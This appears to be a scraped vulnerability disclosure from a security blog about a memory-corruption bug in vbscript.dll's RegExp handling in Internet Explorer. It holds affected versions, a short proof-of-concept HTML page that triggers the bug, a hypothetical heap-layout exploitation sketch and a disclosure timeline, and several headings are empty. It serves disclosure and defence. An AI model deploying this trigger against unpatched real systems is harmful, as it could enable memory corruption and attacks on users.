Source: http://blog.skylined.nl/20161108001.html
 
Synopsis
 
 
Known affected versions, attack vectors and mitigations
 
vbscript.dll
 
The issue is known to have affected versions 5.8.7600.16385 - 5.8.9600.16384, and both the 32- and 64-bit vbscript.dll binaries. It may also impact earlier versions as well as later versions as I am not sure exactly when the issue was addressed by Microsoft.
 
Windows Script Host
 
 
Microsoft Internet Explorer
 
 
Internet Information Server (IIS)
 
-->
 
<!DOCTYPE html>
<html>
  <head>
    <meta http-equiv="x-ua-compatible" content="IE=10">
    <script language="VBScript">
      Dim oRegExp
      Set oRegExp = New RegExp
      Sub RegExpSetPattern(sPattern)
        oRegExp.Pattern = sPattern
      End Sub
      Function RegExpExecute(sData)
        RegExpExecute = oRegExp.Execute(sData)
      End Function
    </script>
    <script language="Javascript">
      RegExpSetPattern("\u0504\u0706\u0908\u0B0A\u0D0C\u0F0E\u1110\u1312\u1514\u1716\u1918\u1B1A\\");
      var oObject = RegExpExecute("23456789ABCD\0");
    </script>
  </head>
</html>
 
<!--
Description
 
 
Exploit
 
 
 
I did not implement such an attack, but here&#039;s one example of what it might look like:
 
Let&#039;s assume we can allocate 0x20 bytes of heap, of which the last four bytes contain a pointer into a dll and then free it.
 
0000 ?? ?? ?? ??  ?? ?? ?? ??  ?? ?? ?? ??  ?? ?? ?? ??  |  ????????
0010 ?? ?? ?? ??  ?? ?? ?? ??  ?? ?? ?? ??  <<pointer>>  |  ??????ab
 
 
Let&#039;s also assume we can allocate a heap block immediately following it in which we can control the first four bytes and set them to "]\0", or [5D 00 00 00].
 
0000 ?? ?? ?? ??  ?? ?? ?? ??  ?? ?? ?? ??  ?? ?? ?? ??  |  ????????
0010 ?? ?? ?? ??  ?? ?? ?? ??  ?? ?? ?? ??  <<pointer>>  |  ??????ab
0020 5D 00 00 00  ?? ?? ?? ??  ?? ?? ?? ??  ?? ?? ?? ??  |  ].??????
 
 
0000 18 00 00 00  34 00 36 00  38 00 3A 00  3C 00 3E 00  |  ..468ACE
0010 30 00 32 00  7C 00 5B 00  5C 00 00 00  <<pointer>>  |  02|[\.ab
0020 5D 00 00 00  ?? ?? ?? ??  ?? ?? ?? ??  ?? ?? ?? ??  |  ].??????
 
 
Time-line
 
June 2014: This vulnerability was found through fuzzing, but I was unable to reproduce it outside of my fuzzing framework for unknown reasons.
April 2015: This vulnerability was found through fuzzing again.
April 2015: This vulnerability was submitted to ZDI.
May 2015: ZDI rejects the submission.
November 2016: The issue does not reproduce in the latest build of MSIE 11.
November 2016: Details of this issue are released.
-->

